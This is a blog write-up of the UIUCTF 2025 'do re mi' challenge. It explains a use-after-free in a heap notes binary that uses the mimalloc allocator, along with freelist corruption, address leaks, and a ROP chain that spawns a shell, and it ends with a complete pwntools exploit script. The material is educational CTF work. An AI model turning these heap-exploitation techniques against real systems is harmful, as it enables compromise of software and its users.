---
layout: post
date: 2025-07-28 23:00:00 +0530
title: UIUCTF 2025 - do re mi
categories: Heap Writeup
tags: Writeup
description: UAF in program using mimalloc
media_subpath: /assets/media/uiuctf-2025-doremi/
---

## Introduction

Last weekend we played UIUCTF, it had some interesting pwn challenges although most of them relied on UEFI-related concepts which we didn't have much luck with solving. I find challenges involving different malloc implementations quite interesting so I decided to make a writeup on this challenge. It's a classic heap notes challenge with a simple UAF bug except it uses the [mimalloc](https://github.com/microsoft/mimalloc) implementation.

## Challenge description

`The musl allocator was too slow, so we went to a company known for 🚀 Blazing Fast 🚀 software, Microsoft!`

Handout Files:
- chal (Challenge Binary)
- chal.c (Source File)
- libmimalloc.so.2.2 (mimalloc library file)
- Dockerfile

## Initial Analysis

`checksec` reveals that the binary has all protections enabled. 

```bash
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'./libs'
# Stripped:   No
# Debuginfo:  Yes
```

```bash
file libs/libmimalloc.so.2.2 
libs/libmimalloc.so.2.2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=fee50cb823745ad4edcd89e9b009161cc6b7cbfd, with debug_info, not stripped
```

We're given a `libmimalloc.so.2.2` file, this library file is used for the `mimalloc` implementation of malloc. It is a drop-in replacement for `malloc`, which means that you can simply load the library file to use `mimalloc` instead of `ptmalloc`.

`mimalloc` appears to have more security features than `ptmalloc`, such as guard pages, free-list pointers encoded using per-page keys, randomised allocation order etc.

It was unclear whether these features have been enabled or not so I decided to dynamically analyse and understand how these features may affect exploitation.

The challenge is a standard heap notes challenge with options to create, delete, read and update note contents.
```bash
###################################
# Yet Another Heap Note Challenge #
###################################
    What Would You Like to Do:     
        1. Create a Note           
        2. Delete a Note           
        3. Read a Note             
        4. Update a Note           
        5. Exit                    
YAHNC>
```

It asks us for the index we would like to create the note at (from 0-15), if we choose the create note option. This indicates we can have a maximum of 16 allocated chunks at a time which we can control.

```bash
YAHNC> 1
Position? (0-15): 0
Done!
```

If we try to update the note, it prompts us for the note index and the content (up to 127 chars). 

```bash
YAHNC> 4
Position? (0-15): 0
Content? (127 max): B4tMite
Done!
```

If we delete the note and then try to read it, we can see that I can access the deleted note's contents, this indicates that we have a UAF as the pointer to the chunk was not cleared after the chunk was deleted.

```bash
YAHNC> 2
Position? (0-15): 0
Done!
YAHNC> 3
Position? (0-15): 0
B4tMite

Done!
```

We can see that the program doesn't stop printing at the newline character, this will be helpful for leaks.

```bash
YAHNC> 4
Position? (0-15): 0
Content? (127 max): R0b1n
Done!
YAHNC> 3
Position? (0-15): 0
R0b1n
e

Done!
```

Ok, now we can look at the source file to confirm our hypotheses.

## Static Analysis

We've been given the source file for the challenge, let's go through it to understand what other restrictions we may be dealing with.

```c
#define NOTE_COUNT 16
#define NOTE_SIZE  128
```

As mentioned in the challenge, we can make 16 notes with a size of 128, it is the only size we can allocate.

```c
void delete() {
   unsigned int number = get_index();
   free(notes[number]);
   printf("Done!\n");
   return; 
}
```

We have a UAF vulnerability as `notes[number]` is not set to `NULL` after being freed.

## Dynamic Analysis

To get an idea of how memory allocation is different in mimalloc I decided to dynamically analyse the program.

### Issues

This is when I ran into a few problems, you can't view the mimalloc bins easily without gef and [bata24's](https://github.com/bata24/gef) plugins. Most of my time was spent on getting this setup the way I wanted it.

Another thing I had to setup was debugging the program on docker since I didn't want to deal with any issues later that usually come up when process memory handling is involved.

Once I'd dealt with these things, I had to figure out how the `mimalloc-heap-dump` command works, I built off of the intuition that the function would have to know where the freelist pointers were. 

In order to use the command properly, you would have to know where `_mi_heap_main` would start. Once I figured out how chunk allocation and freelist handling in mimalloc worked I was able to roughly pinpoint it to 0x100 bytes from the beginning of the new memory mapping.

### Memory Allocation

I allocated a bunch of chunks and freed them to see what happens. It appears when the heap is initialised a new memory mapping is created for the thread which keeps track of the allocated chunk list, freelists and stores the chunks as well.

![img-description](new_mapping.png){: width="700"}
_newly created mapping highlighted in red_

The structure of the chunk allocation is shown in the image. A bin has an entire page allocated for it with the page divided into chunk segments which are allocated upon request. This is separate from the actual freed chunk list.

![img-description](bin_layout.png){: width="500"}
_chunk allocation layout_

- A ***freelist*** keeps track of the next free chunk which has not been allocated before.
- Another ***local_freelist*** keeps track of the chunks the program has explicitly freed in the order it was freed.
- Once the freelist is exhausted, i.e, there are no more chunks in the page that haven't been used before, the local_freelist for the thread is checked.
- The local_freelist exists to prevent issues caused by insertion of chunks freed by other running threads into the freelist.
- These lists are singly-linked and there appear to be no checks for any corruption.

![img-description](lists.png){: width="700"}
_unallocated_freelist: red, local_freelist: green_

Now that I knew how the freelist was laid out and how the pointers would look like in memory all I had to do was use the `mimalloc_heap_dump` command to get a better visualisation of the freelist.

![img-description](mi_heap_dump.png){: width="700"}
_mimalloc_heap_dump visualisation_

The freelist entries were corrupted since it was dereferencing the address right above the actual freelist pointer, since the rest of the information it displayed seemed to be correct, I decided to ignore this issue.

Armed with this knowledge I tried to check whether there would be any restrictions on double freeing chunks, I freed a chunk A, then freed chunk B and freed A again, akin to how you would try to double free in fastbins.

Once the freelist runs out of chunks to allocate, it will start to allocate from the local_freelist and sure enough it ends up allocating the chunk A twice without any issues.

---

Note: Between the chaos of the setup and understanding how the mimalloc implementation worked, I forgot that the UAF would allow me to overwrite chunk metadata without having to resort to a double-free. The double-frees can be used to maintain access to the old chunk pointers, although there are other ways to get past this so I decided to leave my exploit unchanged.

---

## Exploitation

### Obtaining Leaks

Now that we have all the relevant information about the allocator, we can start with the exploit. I decided to get a stack leak and ROP to get a shell. But first we need leaks.

In my approach, I leaked the following addresses:
- TLS address (To leak environ pointer)
- Stack address (To overwrite return address and ROP)
- Linker base address (For standard symbols like `system()` and gadgets)
- Libc base address (Confused about the above statement? me too)
- mi_page base (To manipulate and visualise the freelist)

We can leak freed chunk metadata to get the mi_page base leak and find where `_mi_heap_main` points. Allocate 2 chunks and free them, this will create pointers to each other in the chunk metadata, we can then use the UAF to leak from one of the chunks to get the leak.

Now we need a way to allocate at a controlled address, we can do this by gaining control of the local_freelist pointers. The local_freelist has pointers which are made up by the chunk metadata of the freed chunks. This means if we can overwrite freed chunk metadata then we can control where one of the pointers/chunks in the local_freelist points.

![img-description](bef_ovr.png){: width="500"}
_freelist before the overwrite_

Since we have a UAF and a heap leak, we can update the `fd` of one of the chunks to point to our target chunk address. In this case we will update it to point a bit ahead of the `_mi_heap_main`  to leak the libc base.  

![img-description](aft_ovr.png){: width="500"}
_freelist after overwrite_

Once we've corrupted the local_freelist, we just need to allocate enough chunks to completely exhaust the page freelist, this takes 0x20 chunk allocations for a size of 0x80. Once these chunks are exhausted, the local_freelist will be used for allocation, getting us a chunk at our target address.

Since I overwrote the `fd` with a chunk address that had another libc address in its `fd`, I get another allocation into the libc which contains a TLS address, this gives me the TLS base leak as well. I had to leak the TLS base as the environ pointer was stored in the TLS, which I needed for the stack leak.

Once the local_freelist was exhausted, I figured the allocator would create a new page for further allocations, this did not seem to be the case, however, as it kept looping between checking the actual freelist and the local_freelist. As long as I freed some chunks explicitly it would keep using the local_freelist chunks.

We can repeat the same steps as before to get allocations at the TLS for the stack leak and an allocation at the stack to perform a Ret2System.

### Calling System

At this point, I noticed that symbols like system and any ROP gadgets were stored in the linker memory instead of libc. This prompted me to get an ld leak as well. I got the ld leak by allocating onto the stack and leaking main's return address which happened to be an ld address. 

>**Tip:** You can load the ld like you would normally load the libc in your script to get the offsets easily, for example `ld = ELF("./ld-musl-x86_64.so.1")`
{: .prompt-info }

Once you have the ld leak, we can simply use ld base as an offset to the rest of the symbols we need, pwntools makes this easier for you by getting the offsets from the files you've loaded.

We just need to call `system()` with a pointer to the string `/bin/sh` in the `RDI` argument to spawn a shell.

**Flag: `uiuctf{does_anyone_still_like_doing_these_?_have_we_not_conquered_every_land_?}`**


## Final Exploit

You can find the challenge handout and my exploit [here](https://github.com/TheB4tMite/CTF-Writeups/tree/main/UIUCTF_25/do_re_mi).

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --libc libs/libc.musl-x86_64.so.1 chal_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chal_patched')

context.terminal = ['kitty']

if args.DBG:
	context.log_level = 'debug'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DBG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOL LIB
if args.LIB:
    libc = exe.libc
    ld = exe.linker
else:
    library_path = libcdb.download_libraries('./libs/libmimalloc.so.2.2')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libs/libmimalloc.so.2.2')
        ld = ELF('./libs/ld-musl-x86_64.so.1')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.DOCK:
        return remote("localhost",1337)
    elif args.REM:
        return remote("doremi.chal.uiuc.tf",1337,ssl=True)
    else:
        return process([exe.path] + argv, *a, **kw)

# MACROS
def s(a) : return p.send(a)
def sl(a) : return p.sendline(a)
def sa(a,b) : return p.sendafter(a,b)
def sla(a,b) : return p.sendlineafter(a,b)
def stb(var) : return str(var).encode()
def rv(a) : return p.recv(a)
def ru(a) : return p.recvuntil(a)
def ra() : return p.recvall()
def rl() : return p.recvline()
def nul(a): return b'\0'*a
def cyc(a): return cyclic(a)
def rrw(var, list) : [var.raw(i) for i in list]
def rfg(var,a) : return var.find_gadget(a)[0]
def rch(var) : return var.chain()
def rdm(var) : return var.dump()
def inr() : return p.interactive()
def cls() : return p.close()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b * create+0x1f
b look
b update
b delete
'''.format(**locals())

def create(idx):
    sla(b'YAHNC> ',b'1')
    sla(b'Position',stb(idx))
    info(f"CREATE [{idx}]")

def update(idx,cont):
    sla(b'YAHNC> ',b'4')
    sla(b'Position',stb(idx))
    sa(b'Content',cont)
    info(f"UPDATE [{idx}]")

def delete(idx):
    sla(b'YAHNC> ',b'2')
    sla(b'Position',stb(idx))
    info(f"DELETE [{idx}]")

def look(idx):
    sla(b'YAHNC> ',b'3')
    sla(b'Position',stb(idx))
    info(f"LOOK [{idx}]")

'''
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> BEGIN EXPLOIT <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
'''
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'./libs'
# Stripped:   No
# Debuginfo:  Yes

p = start()

# Notes on mimalloc:
# 1) A bin has an entire page allocated for it with the page divided into free chunk segments.
# 2) Force freed chunk segments are put in the local_free list for that thread
# 3) If the page runs out of segments then the local_free list is checked and used for further allocations.

# DEBUGGING SETUP
#os.system("kitty --detach zsh -c 'gdb --pid $(pidof /home/user/chal) -ex \"source gdbscript\"'")
#pause()

create(0)
create(1)
delete(0)
delete(1)
look(1)
ru(b'(0-15): ')
_mi_heap_main = u64(rv(6).ljust(8,b'\0')) - 0x10080 + 0x100
success(f"HEAP MAIN: {hex(_mi_heap_main)}")

delete(0)
update(1,p64(_mi_heap_main+0xc0))
create(0)

for i in range(0x1d): create(2)

create(0)
create(1)
create(2)
create(3)
look(2)
ru(b'(0-15): ')
libc.address = u64(rv(8)) - 0x2b100 
success(f"LIBC: {hex(libc.address)}")

look(3)
ru(b'(0-15): '); rv(0x10)
tls = u64(rv(8)) - 0x1b28
success(f"TLS: {hex(tls)}")

delete(0)
delete(1)
delete(0)
update(1,p64(tls+0x1d50))

for i in range(3): create(2)
create(4)
look(4)
ru(b'(0-15): '); rv(0x10)
stack = u64(rv(8))
ret = stack - 0x70
success(f"STACK: {hex(stack)}")
success(f"RET: {hex(stack-0x70)}")

delete(0)
delete(1)
delete(0)
update(1,p64(ret))

create(0)
create(1)
create(2)

look(2)
ru(b'(0-15): ')
rv(0x20)
ld.address = u64(rv(8)) - 0x41496
info(f"LD: {hex(ld.address)}")

rop = ROP(ld)
payl = [ rfg(rop,['pop rdi','ret'])+1, rfg(rop,['pop rdi','ret']), next(ld.search(b'/bin/sh\0')), ld.sym['system'] ]
rrw(rop,payl)
log.warn(rdm(rop))
payload = rch(rop)
update(2,payload)

sl(b"echo '$$'")
ru(b'$$\n')
sl(b'cat flag')
flag = ru(b'}').decode()
log.success(f"FLAG: {flag}")

# FLAG: uiuctf{does_anyone_still_like_doing_these_?_have_we_not_conquered_every_land_?}
```

